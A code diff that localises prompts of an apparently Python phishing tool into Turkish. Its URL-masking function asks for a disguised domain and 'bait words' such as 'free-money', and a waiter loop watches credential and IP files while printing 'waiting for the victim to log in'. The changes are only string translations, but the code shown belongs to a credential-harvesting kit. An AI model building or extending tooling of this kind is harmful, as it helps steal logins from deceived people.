@@ -1017,13 +1017,13 @@ def masking(url):
             waiter()
     short = shortened.replace("http://", "").replace("https://", "")
     # Remove slash and spaces from inputs
-    domain = input(f"\n{ask}Enter custom domain(Example: google.com, yahoo.com > ")
+    domain = input(f"\n{ask}Alan Adını Değiştirin örn:google.instagram ")
     if domain == "":
         sprint(f"\n{error}No domain!")
         domain = "https://"
     else:
         domain = "https://" + sub("([/%+&?={} ])", ".", sub("https?://", "", domain))
-    bait = input(f"\n{ask}Enter bait words with hyphen without space (Example: free-money, pubg-mod) > ")
+    bait = input(f"\n{ask}İnandırıcı Bir Yem kullanın örn:reel.videos ")
     if bait=="":
         sprint(f"\n{error}No bait word!")
         if domain!="https://":
@@ -1421,7 +1421,7 @@ def server():
 def waiter():
     global is_mail_ok
     delete(ip_file, cred_file)
-    sprint(f"\n{info}{blue}KURBANIN GİRMESİ BEKLENİYOR{cyan}Press {red}Ctrl+C{cyan} to exit")
+    sprint(f"\n{info}{blue}KURBANIN GİRMESİ BEKLENİYOR{cyan}Çıkmak için {red}Ctrl+C{cyan} ' ye Basabilirsiniz")
     try:
         while True:
             if isfile(ip_file):
